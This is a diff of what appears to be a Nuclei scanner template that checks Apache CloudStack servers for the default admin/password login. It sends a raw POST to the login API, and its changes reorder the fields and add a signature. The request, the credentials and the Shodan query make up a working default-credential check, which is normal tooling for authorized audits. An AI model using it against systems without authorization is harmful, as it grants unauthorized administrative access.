@@ -1,4 +1,5 @@
 id: cloudstack-default-login
+
 info:
   name: Apache CloudStack - Default Login
   author: DhiyaneshDK
@@ -8,29 +9,15 @@ info:
   classification:
     cpe: cpe:2.3:a:apache:cloudstack:*:*:*:*:*:*:*:*
   metadata:
-    runzero-match: any(each(service["html.titles"]), {# matches "Apache CloudStack"})
+    verified: true
     max-request: 1
+    vendor: apache
     product: cloudstack
     shodan-query: http.title:"Apache CloudStack"
-    vendor: apache
-    verified: true
-  tags: apache,cloudstack,default-login,vuln
+  tags: default-login,apache,cloudstack,vuln
+
 http:
-  - attack: pitchfork
-    host-redirects: true
-    matchers:
-      - condition: and
-        dsl:
-          - status_code == 200
-          - contains(content_type, 'application/json')
-          - contains_all(body, 'sessionkey','domainid','userid')
-        type: dsl
-    payloads:
-      password:
-        - password
-      username:
-        - admin
-    raw:
+  - raw:
       - |
         POST /client/api/ HTTP/1.1
         Host: {{Hostname}}
@@ -38,3 +25,19 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         command=login&username={{username}}&password={{password}}&domain=%2F&response=json
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - password
+    host-redirects: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(content_type, 'application/json')"
+          - "contains_all(body, 'sessionkey','domainid','userid')"
+        condition: and
+# digest: 4b0a00483046022100e1e0e77fd49f1f503b9afaf70b42fcbb4cb1cd1a8e40e3ded61767d73b5a95fd022100eea6bb0e51ecb8a46a8b250166f1b84676a45b3b420918d4b67d243ccced9bd8:922c64590222798bb761d5b6d8e72950
